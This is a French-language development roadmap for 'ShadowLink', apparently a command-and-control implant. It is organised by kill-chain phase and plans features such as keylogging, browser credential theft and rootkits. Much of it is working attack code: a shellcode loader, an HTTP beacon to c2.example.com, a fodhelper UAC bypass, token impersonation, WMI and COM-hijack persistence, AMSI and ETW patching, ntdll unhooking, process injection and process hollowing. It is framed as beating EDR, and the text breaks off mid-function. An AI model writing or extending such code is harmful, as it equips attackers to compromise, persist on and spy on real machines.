# 🚀 ShadowLink - Futures Améliorations

> **Roadmap organisée selon la Cyber Kill Chain**
> 
> Ce document liste toutes les techniques et fonctionnalités qui pourraient être implémentées, organisées par phase d'attaque.

---

# PARTIE 1 : SYNTHÈSE

---

## 📋 Vue d'ensemble par phase Kill Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    FUTURES AMÉLIORATIONS - KILL CHAIN                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  PHASE 2: WEAPONIZATION          PHASE 3: DELIVERY                         │
│  ├── Polymorphic Engine          ├── HTTP/HTTPS C2                         │
│  ├── Shellcode Generation        ├── Domain Fronting                       │
│  ├── Packer/Crypter              ├── DNS Tunneling                         │
│  └── Multi-Format Output         └── Traffic Piggyback                     │
│                                                                             │
│  PHASE 4: EXPLOITATION           PHASE 5: INSTALLATION                     │
│  ├── UAC Bypass                  ├── Scheduled Tasks                       │
│  ├── Token Impersonation         ├── WMI Event Subscription                │
│  ├── Privilege Escalation        ├── COM Hijacking                         │
│  └── BYOVD                       ├── DLL Hijacking                         │
│                                  └── Bootkit/Rootkit                       │
│                                                                             │
│  PHASE 5b: DEFENSE EVASION       PHASE 6: C2 AVANCÉ                        │
│  ├── String Encryption           ├── Jitter Implementation                 │
│  ├── Direct Syscalls             ├── Malleable C2 Profiles                 │
│  ├── API Hashing Complet         ├── Encrypted DNS (DoH)                   │
│  ├── AMSI Bypass                 ├── Redirectors                           │
│  ├── ETW Patching                └── P2P Communication                     │
│  ├── Unhooking ntdll.dll                                                   │
│  ├── Sleep Obfuscation           PHASE 7: ACTIONS                          │
│  ├── Process Injection           ├── Screenshot                            │
│  ├── Process Hollowing           ├── Keylogger                             │
│  ├── PPID Spoofing               ├── Clipboard Monitor                     │
│  └── LOLBins                     ├── Webcam/Audio Capture                  │
│                                  ├── Browser Credentials                   │
│  ROOTKITS (Avancé):              └── Lateral Movement                      │
│  ├── User-Mode (IAT/Inline)                                                │
│  ├── Kernel-Mode (SSDT/DKOM)     INFRASTRUCTURE:                           │
│  ├── Bootkits (MBR/UEFI)         ├── Web Interface                         │
│  └── Hypervisor                  ├── Team Server                           │
│                                  └── Payload Generator                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📊 Index des fonctionnalités par phase

### Phase 2 : Weaponization (Création du payload)

| Fonctionnalité | Difficulté | Priorité | Status |
|----------------|------------|----------|--------|
| Polymorphic Engine | 🔴 Difficile | 🟡 Medium | ⏳ |
| Shellcode Generation | 🔴 Difficile | 🟡 Medium | ⏳ |
| Packer/Crypter | 🟡 Moyenne | 🔴 High | ⏳ |
| Multi-Format Output (EXE, DLL, PS1, VBA) | 🟡 Moyenne | 🟡 Medium | ⏳ |

### Phase 3 : Delivery (Livraison)

| Fonctionnalité | Difficulté | Priorité | Status |
|----------------|------------|----------|--------|
| HTTP/HTTPS C2 | 🟡 Moyenne | 🔴 High | ⏳ |
| Domain Fronting | 🔴 Difficile | 🔴 High | ⏳ |
| DNS Tunneling | 🟡 Moyenne | 🟡 Medium | ⏳ |
| Traffic Piggyback | 🔴 Difficile | 🟢 Low | ⏳ |
| Encrypted DNS (DoH/DoT) | 🟡 Moyenne | 🟡 Medium | ⏳ |

### Phase 4 : Exploitation (Privilege Escalation)

| Fonctionnalité | Difficulté | Priorité | Status |
|----------------|------------|----------|--------|
| UAC Bypass (fodhelper, eventvwr) | 🟡 Moyenne | 🔴 High | ⏳ |
| Token Impersonation (Potato) | 🟡 Moyenne | 🟡 Medium | ⏳ |
| Named Pipe Impersonation | 🟡 Moyenne | 🟡 Medium | ⏳ |
| Service Exploitation | 🟡 Moyenne | 🟡 Medium | ⏳ |
| BYOVD (Bring Your Own Vulnerable Driver) | 🔴 Difficile | 🟢 Low | ⏳ |

### Phase 5a : Installation (Persistence)

| Fonctionnalité | Difficulté | Priorité | Status |
|----------------|------------|----------|--------|
| Scheduled Tasks | 🟢 Facile | 🔴 High | ⏳ |
| WMI Event Subscription | 🟡 Moyenne | 🟡 Medium | ⏳ |
| COM Hijacking | 🟡 Moyenne | 🟡 Medium | ⏳ |
| DLL Search Order Hijacking | 🟡 Moyenne | 🟡 Medium | ⏳ |
| AppInit_DLLs | 🟢 Facile | 🟡 Medium | ⏳ |
| Bootkit/Rootkit | 🔴 Très difficile | 🟢 Low | ⏳ |

### Phase 5b : Defense Evasion

| Fonctionnalité | Difficulté | Priorité | Status |
|----------------|------------|----------|--------|
| String Encryption Complète | 🟢 Facile | 🔴 High | ⏳ |
| Direct Syscalls | 🔴 Difficile | 🔴 High | ⏳ |
| API Hashing Complet | 🟡 Moyenne | 🔴 High | 🔶 Partiel |
| AMSI Bypass | 🟡 Moyenne | 🔴 High | ⏳ |
| ETW Patching | 🟡 Moyenne | 🟡 Medium | ⏳ |
| Unhooking ntdll.dll | 🟡 Moyenne | 🔴 High | ⏳ |
| Sleep Obfuscation | 🟡 Moyenne | 🟡 Medium | ⏳ |
| PPID Spoofing | 🟡 Moyenne | 🟡 Medium | ⏳ |
| Process Injection | 🔴 Difficile | 🔴 High | ⏳ |
| Process Hollowing | 🔴 Difficile | 🟡 Medium | ⏳ |
| Thread Hijacking | 🔴 Difficile | 🟡 Medium | ⏳ |
| Callback Injection | 🟡 Moyenne | 🟡 Medium | ⏳ |
| LOLBins Execution | 🟢 Facile | 🟡 Medium | ⏳ |
| Process Name Masquerading | 🟡 Moyenne | 🟢 Low | ⏳ |
| Exécution Sans cmd.exe | 🟡 Moyenne | 🟡 Medium | ⏳ |

### Phase 5c : Rootkits (Très avancé)

| Fonctionnalité | Difficulté | Priorité | Status |
|----------------|------------|----------|--------|
| IAT Hooking | 🟡 Moyenne | 🟢 Low | ⏳ |
| Inline Hooking (Detours) | 🟡 Moyenne | 🟢 Low | ⏳ |
| SSDT Hooking | 🔴 Très difficile | 🟢 Low | ⏳ |
| DKOM (Process Hiding) | 🔴 Très difficile | 🟢 Low | ⏳ |
| Filter Drivers | 🔴 Très difficile | 🟢 Low | ⏳ |
| MBR/VBR Bootkit | 🔴 Extrême | 🟢 Low | ⏳ |
| UEFI Rootkit | 🔴 Extrême | 🟢 Low | ⏳ |
| Hypervisor Rootkit | 🔴 Extrême | 🟢 Low | ⏳ |

### Phase 6 : Command & Control (Avancé)

| Fonctionnalité | Difficulté | Priorité | Status |
|----------------|------------|----------|--------|
| Jitter Implementation | 🟢 Facile | 🔴 High | ⏳ |
| Malleable C2 Profiles | 🟡 Moyenne | 🟡 Medium | ⏳ |
| Redirectors | 🟡 Moyenne | 🟡 Medium | ⏳ |
| P2P Communication | 🔴 Difficile | 🟢 Low | ⏳ |

### Phase 7 : Actions on Objectives

| Fonctionnalité | Difficulté | Priorité | Status |
|----------------|------------|----------|--------|
| Screenshot | 🟢 Facile | 🔴 High | ⏳ |
| Keylogger | 🟢 Facile | 🔴 High | ⏳ |
| Clipboard Monitor | 🟢 Facile | 🟡 Medium | ⏳ |
| Webcam Capture | 🟡 Moyenne | 🟢 Low | ⏳ |
| Audio Recording | 🟡 Moyenne | 🟢 Low | ⏳ |
| Browser Credential Extraction | 🟡 Moyenne | 🔴 High | ⏳ |
| WiFi Password Extraction | 🟢 Facile | 🟡 Medium | ⏳ |

### Infrastructure

| Fonctionnalité | Difficulté | Priorité | Status |
|----------------|------------|----------|--------|
| Web Interface (GUI) | 🟡 Moyenne | 🟡 Medium | ⏳ |
| Team Server | 🟡 Moyenne | 🟢 Low | ⏳ |
| Payload Generator | 🟡 Moyenne | 🟡 Medium | ⏳ |

---

## 🎯 Priorités d'implémentation recommandées

### Sprint 1 : Évasion de base (Impact immédiat)

```
1. String Encryption Complète     [Facile]   → Cache les IOCs
2. Jitter Implementation          [Facile]   → Beaconing moins détectable
3. Scheduled Tasks                [Facile]   → Alternative persistance
4. Screenshot                     [Facile]   → Collection utile
5. Keylogger                      [Facile]   → Collection utile
```

### Sprint 2 : Évasion EDR

```
1. HTTP/HTTPS C2                  [Moyenne]  → Passe les firewalls
2. AMSI Bypass                    [Moyenne]  → Exécution PowerShell
3. Unhooking ntdll.dll            [Moyenne]  → Bypass EDR hooks
4. Direct Syscalls                [Difficile] → Bypass total EDR
5. Process Injection              [Difficile] → Exécution furtive
```

### Sprint 3 : Évasion avancée

```
1. Domain Fronting                [Difficile] → C2 indétectable
2. UAC Bypass                     [Moyenne]   → Privilege escalation
3. Browser Credentials            [Moyenne]   → Credential access
4. Malleable C2 Profiles          [Moyenne]   → Traffic blending
```

---

# PARTIE 2 : DÉTAILS TECHNIQUES

---

## 📦 Phase 2 : Weaponization

### 2.1 Polymorphic Engine

**Objectif :** Générer des variants uniques à chaque compilation pour éviter les signatures.

**Techniques :**
```
├── Réorganisation des fonctions (ordre aléatoire)
├── Insertion de code mort (NOP sleds, calculs inutiles)
├── Substitution d'instructions équivalentes
│   ├── mov eax, 0  →  xor eax, eax
│   ├── add eax, 1  →  inc eax
│   └── push X; pop Y  →  mov Y, X
├── Renommage de variables/fonctions
└── Modification des constantes (XOR avec clé différente)
```

**Implémentation conceptuelle :**
```c
// Générateur de variantes
typedef struct {
    unsigned char *code;
    size_t size;
    uint32_t xor_key;
    int function_order[MAX_FUNCTIONS];
} PolymorphicPayload;

PolymorphicPayload* generate_variant() {
    PolymorphicPayload *p = malloc(sizeof(PolymorphicPayload));
    
    // Clé XOR unique
    p->xor_key = rand() ^ time(NULL);
    
    // Ordre des fonctions aléatoire
    shuffle_array(p->function_order, MAX_FUNCTIONS);
    
    // Assembler le code
    assemble_payload(p);
    
    return p;
}
```

---

### 2.2 Shellcode Generation

**Objectif :** Compiler l'agent en shellcode position-independent.

**Contraintes :**
```
├── Pas d'adresses absolues
├── Résolution dynamique des APIs
├── Pas de variables globales initialisées
├── Pas de CRT (C Runtime)
└── Taille minimale
```

**Structure shellcode :**
```asm
; Prologue - Trouver kernel32.dll via PEB
    xor rcx, rcx
    mov rax, gs:[rcx+60h]      ; PEB
    mov rax, [rax+18h]         ; PEB_LDR_DATA
    mov rsi, [rax+20h]         ; InMemoryOrderModuleList
    lodsq                       ; ntdll.dll
    xchg rax, rsi
    lodsq                       ; kernel32.dll
    mov rbx, [rax+20h]         ; Base address

; Résoudre GetProcAddress
    ; Parser PE headers
    ; Trouver Export Directory
    ; Parcourir les noms de fonctions
    
; Charger les APIs nécessaires
    ; LoadLibraryA
    ; VirtualAlloc
    ; etc.
    
; Payload principal
    ; ...
```

---

### 2.3 Packer/Crypter

**Objectif :** Chiffrer le payload et le déchiffrer au runtime.

**Architecture :**
```
┌─────────────────────────────────────────┐
│              PACKED PAYLOAD              │
├─────────────────────────────────────────┤
│  ┌─────────────────────────────────┐    │
│  │         STUB (Loader)           │    │
│  │  ├── Déchiffrement AES/XOR      │    │
│  │  ├── Allocation mémoire RWX     │    │
│  │  └── Jump vers payload          │    │
│  └─────────────────────────────────┘    │
│  ┌─────────────────────────────────┐    │
│  │    ENCRYPTED PAYLOAD (Agent)    │    │
│  │  [AES-256 encrypted blob]       │    │
│  └─────────────────────────────────┘    │
│  ┌─────────────────────────────────┐    │
│  │          KEY MATERIAL           │    │
│  │  [Obfuscated or derived]        │    │
│  └─────────────────────────────────┘    │
└─────────────────────────────────────────┘
```

**Stub minimal :**
```c
void stub() {
    // 1. Localiser le payload chiffré (après le stub)
    unsigned char *encrypted = get_payload_offset();
    size_t size = get_payload_size();
    
    // 2. Dériver la clé (obfusquée)
    unsigned char key[32];
    derive_key(key);
    
    // 3. Allouer mémoire exécutable
    void *mem = VirtualAlloc(NULL, size, 
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 4. Déchiffrer
    aes_decrypt(encrypted, mem, size, key);
    
    // 5. Exécuter
    ((void(*)())mem)();
}
```

---

### 2.4 Multi-Format Output

**Formats supportables :**

| Format | Usage | Avantages |
|--------|-------|-----------|
| **EXE** | Exécution directe | Simple |
| **DLL** | DLL hijacking, injection | Discret |
| **PowerShell** | Fileless | Pas de fichier sur disque |
| **C# Assembly** | .NET execution | Flexible |
| **VBA Macro** | Documents Office | Phishing |
| **HTA** | HTML Application | Exécution web |
| **JS/VBS** | Windows Script Host | Léger |

**Template PowerShell :**
```powershell
# Payload encodé Base64
$enc = "BASE64_SHELLCODE_HERE"
$bytes = [Convert]::FromBase64String($enc)

# Allocation mémoire
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $mem, $bytes.Length)

# Exécution
$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $mem, [Func[IntPtr]]
)
$delegate.Invoke()
```

---

## 📬 Phase 3 : Delivery

### 3.1 HTTP/HTTPS C2

**Architecture :**
```
┌─────────────────────────────────────────────────────────────┐
│                      HTTP C2 PROTOCOL                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  BEACON (Agent → Server):                                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ POST /api/v1/update HTTP/1.1                        │   │
│  │ Host: legitimate-domain.com                         │   │
│  │ User-Agent: Mozilla/5.0 (Windows NT 10.0; ...)      │   │
│  │ Content-Type: application/json                      │   │
│  │                                                     │   │
│  │ {                                                   │   │
│  │   "id": "AGENT_UUID",                               │   │
│  │   "data": "BASE64_AES_ENCRYPTED_DATA"               │   │
│  │ }                                                   │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  TASKING (Server → Agent):                                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ HTTP/1.1 200 OK                                     │   │
│  │ Content-Type: application/json                      │   │
│  │                                                     │   │
│  │ {                                                   │   │
│  │   "tasks": [                                        │   │
│  │     {"id": 1, "cmd": "BASE64_ENCRYPTED_COMMAND"}    │   │
│  │   ]                                                 │   │
│  │ }                                                   │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Implémentation Agent (C avec WinHTTP) :**
```c
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

int http_beacon(const char *data, char *response, size_t resp_size) {
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    
    HINTERNET hConnect = WinHttpConnect(hSession,
        L"c2.example.com", 443, 0);
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST", L"/api/beacon",
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    
    // Envoyer
    WinHttpSendRequest(hRequest, 
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)data, strlen(data), strlen(data), 0);
    
    WinHttpReceiveResponse(hRequest, NULL);
    
    // Lire réponse
    DWORD bytesRead;
    WinHttpReadData(hRequest, response, resp_size, &bytesRead);
    
    // Cleanup
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return bytesRead;
}
```

---

### 3.2 Domain Fronting

**Concept :**
```
┌─────────────────────────────────────────────────────────────┐
│                    DOMAIN FRONTING                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  DNS Resolution:     cdn.microsoft.com → 13.107.246.10      │
│  TLS SNI:            cdn.microsoft.com                      │
│  HTTP Host Header:   real-c2-server.com                     │
│                                                             │
│  ┌─────────┐     ┌─────────────┐     ┌──────────────┐      │
│  │  Agent  │────►│  CDN Edge   │────►│  C2 Server   │      │
│  └─────────┘     │ (Microsoft) │     │ (Fronted)    │      │
│                  └─────────────┘     └──────────────┘      │
│                                                             │
│  Pour un observateur:                                       │
│  "L'agent communique avec Microsoft Azure"                  │
│                                                             │
│  En réalité:                                                │
│  "L'agent communique avec notre C2 via le CDN"              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**CDN supportant (historiquement) :**
- Azure CDN
- CloudFront (AWS)
- Google Cloud CDN
- Fastly

> ⚠️ Note : Beaucoup de CDN ont bloqué cette technique.

---

### 3.3 DNS Tunneling

**Principe :**
```
┌─────────────────────────────────────────────────────────────┐
│                    DNS TUNNELING                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  EXFILTRATION (données encodées dans les sous-domaines):    │
│                                                             │
│  Agent demande:                                             │
│    SGVsbG8gV29ybGQ.data.c2domain.com                        │
│    ^^^^^^^^^^^^^^^^                                         │
│    Base64 de "Hello World"                                  │
│                                                             │
│  COMMANDES (données dans les réponses TXT):                 │
│                                                             │
│  Serveur DNS répond:                                        │
│    TXT "Y21kIC9jIHdob2FtaQ=="                               │
│         ^^^^^^^^^^^^^^^^^                                   │
│         Base64 de "cmd /c whoami"                           │
│                                                             │
│  FLUX:                                                      │
│  Agent ──DNS Query──► Resolver ──► Authoritative NS (C2)    │
│         ◄──DNS Response──────────────────────────────┘      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Avantages :**
- DNS rarement bloqué
- Fonctionne même avec proxy restrictif
- Difficile à détecter sans DPI

**Inconvénients :**
- Lent (petits paquets)
- Volume de données limité

---

### 3.4 Traffic Piggyback

**Techniques d'injection dans le trafic légitime :**

| Technique | Description | Complexité |
|-----------|-------------|------------|
| Browser Injection | Injecter dans Chrome/Firefox | 🔴 Difficile |
| Proxy Local | MITM du trafic système | 🟡 Moyenne |
| WebSocket Hijack | Détourner connexions WS | 🔴 Difficile |
| HTTP Header Injection | Ajouter headers custom | 🟡 Moyenne |

---

## 💥 Phase 4 : Exploitation (Privilege Escalation)

### 4.1 UAC Bypass

**Techniques principales :**

#### fodhelper.exe
```c
void uac_bypass_fodhelper() {
    HKEY hKey;
    
    // Créer la clé
    RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    
    // Définir la commande
    RegSetValueExA(hKey, NULL, 0, REG_SZ, 
        (BYTE*)"C:\\path\\to\\payload.exe", 24);
    
    // Définir DelegateExecute vide
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    
    RegCloseKey(hKey);
    
    // Lancer fodhelper (auto-elevate)
    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe",
        NULL, NULL, SW_HIDE);
    
    Sleep(2000);
    
    // Cleanup
    RegDeleteTreeA(HKEY_CURRENT_USER, 
        "Software\\Classes\\ms-settings");
}
```

#### Autres méthodes
- `eventvwr.exe` - MSC handler
- `computerdefaults.exe` - Protocol handler
- `sdclt.exe` - IsolatedCommand
- `cmstp.exe` - INF file

---

### 4.2 Token Impersonation (Potato Attacks)

**Évolution des Potato :**
```
2016: Hot Potato     → Patché
2016: Rotten Potato  → Patché
2018: Juicy Potato   → Windows <= 10 1809
2020: Rogue Potato   → Windows 10 1903+
2020: Sweet Potato   → Combinaison
2020: PrintSpoofer   → Windows 10/Server 2019
2022: GodPotato      → Toutes versions
2023: CoercedPotato  → Plus récent
```

**PrintSpoofer conceptuel :**
```c
// Nécessite SeImpersonatePrivilege (comptes de service)
void print_spoofer() {
    // 1. Créer un named pipe avec un nom prévisible
    HANDLE hPipe = CreateNamedPipe(
        "\\\\.\\pipe\\spoolss",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE,
        1, 1024, 1024, 0, NULL);
    
    // 2. Trigger la connexion du spooler service
    // via SpoolSample ou autre coercion
    
    // 3. Impersonate le client (SYSTEM)
    ImpersonateNamedPipeClient(hPipe);
    
    // 4. Créer un processus avec le token volé
    HANDLE hToken;
    OpenThreadToken(GetCurrentThread(), 
        TOKEN_ALL_ACCESS, FALSE, &hToken);
    
    CreateProcessWithTokenW(hToken, ...);
}
```

---

## 🔒 Phase 5a : Installation (Persistence)

### 5.1 Scheduled Tasks

```c
void create_scheduled_task() {
    // Via COM (plus discret que schtasks.exe)
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    ITaskService *pService = NULL;
    CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        &IID_ITaskService, (void**)&pService);
    
    pService->Connect(NULL, NULL, NULL, NULL);
    
    ITaskFolder *pRoot = NULL;
    pService->GetFolder(L"\\", &pRoot);
    
    ITaskDefinition *pTask = NULL;
    pService->NewTask(0, &pTask);
    
    // Configurer trigger, action, etc.
    // ...
    
    pRoot->RegisterTaskDefinition(
        L"MicrosoftEdgeUpdateTaskMachineCore",  // Nom légitime
        pTask, TASK_CREATE_OR_UPDATE,
        NULL, NULL, TASK_LOGON_INTERACTIVE_TOKEN,
        NULL, NULL);
}
```

### 5.2 WMI Event Subscription

```powershell
# Persistence fileless via WMI
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{
    EventNamespace = 'root/cimv2'
    Name = 'WindowsUpdateCheck'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    QueryLanguage = 'WQL'
}

$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{
    Name = 'WindowsUpdateHandler'
    CommandLineTemplate = 'C:\Windows\Temp\update.exe'
}

Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

### 5.3 COM Hijacking

```c
void com_hijack() {
    // Trouver un CLSID chargé par un processus privilégié
    // mais sans entrée HKCU (donc fallback sur HKLM)
    
    // Créer notre entrée dans HKCU (prioritaire)
    HKEY hKey;
    RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\CLSID\\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\\InprocServer32",
        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    
    RegSetValueExA(hKey, NULL, 0, REG_SZ, 
        (BYTE*)"C:\\path\\malicious.dll", ...);
    
    RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ,
        (BYTE*)"Both", 5);
    
    RegCloseKey(hKey);
}
```

---

## 🛡️ Phase 5b : Defense Evasion

### 5.4 String Encryption Complète

```c
// Macro pour chiffrer les strings à la compilation
#define XOR_KEY 0x42

#define ENCRYPTED_STRING(str) decrypt_string((unsigned char*)str, sizeof(str)-1, XOR_KEY)

char* decrypt_string(unsigned char *enc, size_t len, unsigned char key) {
    char *dec = malloc(len + 1);
    for (size_t i = 0; i < len; i++) {
        dec[i] = enc[i] ^ key;
    }
    dec[len] = 0;
    return dec;
}

// Strings chiffrées (générées par un outil)
unsigned char enc_cmd[] = {0x21, 0x2d, 0x22, 0x04, 0x27, 0x20, 0x27};  // "cmd.exe" XOR 0x42

// Usage
char *cmd = ENCRYPTED_STRING(enc_cmd);
CreateProcessA(NULL, cmd, ...);
free(cmd);
```

---

### 5.5 Direct Syscalls

```c
// Structure pour stocker les numéros de syscall
typedef struct {
    DWORD NtAllocateVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtCreateThreadEx;
} SYSCALL_TABLE;

// Résoudre les numéros depuis ntdll.dll sur disque
void resolve_syscalls(SYSCALL_TABLE *table) {
    // Mapper ntdll.dll depuis le disque
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", ...);
    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    void *ntdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    
    // Parser les exports, trouver les fonctions
    // Lire le numéro de syscall (mov eax, XX; syscall pattern)
    table->NtAllocateVirtualMemory = get_syscall_number(ntdll, "NtAllocateVirtualMemory");
    // etc.
}

// Appel direct
__declspec(naked) NTSTATUS NTAPI NtAllocateVirtualMemory_Direct(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    __asm {
        mov r10, rcx
        mov eax, [syscall_table.NtAllocateVirtualMemory]
        syscall
        ret
    }
}
```

---

### 5.6 AMSI Bypass

```c
void bypass_amsi() {
    // Charger amsi.dll (si pas déjà chargé)
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;
    
    // Trouver AmsiScanBuffer
    void *pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return;
    
    // Rendre la mémoire writable
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Patch: xor eax, eax (met AMSI_RESULT_CLEAN)
    //        ret
    unsigned char patch[] = {0x31, 0xC0, 0xC3};
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    
    // Restaurer protections
    VirtualProtect(pAmsiScanBuffer, 8, oldProtect, &oldProtect);
}
```

---

### 5.7 ETW Patching

```c
void patch_etw() {
    // Patcher EtwEventWrite pour qu'elle ne fasse rien
    void *pEtwEventWrite = GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Patch: ret (0xC3)
    *(BYTE*)pEtwEventWrite = 0xC3;
    
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
}
```

---

### 5.8 Unhooking ntdll.dll

```c
void unhook_ntdll() {
    // 1. Mapper une copie fraîche de ntdll depuis le disque
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    
    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    void *pCleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    
    // 2. Trouver la section .text
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pCleanNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            // 3. Copier la section propre vers la ntdll en mémoire
            void *pHookedNtdll = GetModuleHandleA("ntdll.dll");
            void *pHookedText = (BYTE*)pHookedNtdll + pSection[i].VirtualAddress;
            void *pCleanText = (BYTE*)pCleanNtdll + pSection[i].PointerToRawData;
            
            DWORD oldProtect;
            VirtualProtect(pHookedText, pSection[i].SizeOfRawData,
                PAGE_EXECUTE_READWRITE, &oldProtect);
            
            memcpy(pHookedText, pCleanText, pSection[i].SizeOfRawData);
            
            VirtualProtect(pHookedText, pSection[i].SizeOfRawData,
                oldProtect, &oldProtect);
            
            break;
        }
    }
    
    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMap);
    CloseHandle(hFile);
}
```

---

### 5.9 Process Injection

```c
void classic_injection(DWORD pid, unsigned char *shellcode, size_t size) {
    // 1. Ouvrir le processus cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // 2. Allouer mémoire dans le processus cible
    void *pRemote = VirtualAllocEx(hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 3. Écrire le shellcode
    WriteProcessMemory(hProcess, pRemote, shellcode, size, NULL);
    
    // 4. Créer un thread distant
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
}
```

---

### 5.10 Process Hollowing

```c
void process_hollowing(char *target, unsigned char *payload, size_t size) {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    
    // 1. Créer le processus suspendu
    CreateProcessA(target, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // 2. Obtenir le contexte du thread principal
    CONTEXT ctx = {CONTEXT_FULL};
    GetThreadContext(pi.hThread, &ctx);
    
    // 3. Lire le PEB pour trouver l'image base
    PVOID pImageBase;
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
        &pImageBase, sizeof(PVOID), NULL);
    
    // 4. Unmapper l'image originale
    NtUnmapViewOfSection(pi.hProcess, pImageBase);
    
    // 5. Allouer mémoire pour notre payload
    void *pNewBase = VirtualAllocEx(pi.hProcess, pImageBase, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 6. Écrire le payload
    WriteProcessMemory(pi.hProcess, pNewBase, payload, size, NULL);
    
    // 7. Mettre à jour le PEB avec la nouvelle base
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
        &pNewBase, sizeof(PVOID), NULL);
    
    // 8. Mettre à jour RCX (entry point)
    ctx.Rcx = (DWORD64)pNewBase + entrypoint_offset;
    SetThreadContext(pi.hThread, &ctx);
    
    // 9. Reprendre l'exécution
    ResumeThread(pi.hThread);
}
```

---

## 📡 Phase 6 : Command & Control (Avancé)

### 6.1 Jitter Implementation

```c
#define BEACON_INTERVAL 60000  // 60 secondes base
#define JITTER_PERCENT 30      // +/- 30%

DWORD get_jittered_sleep() {
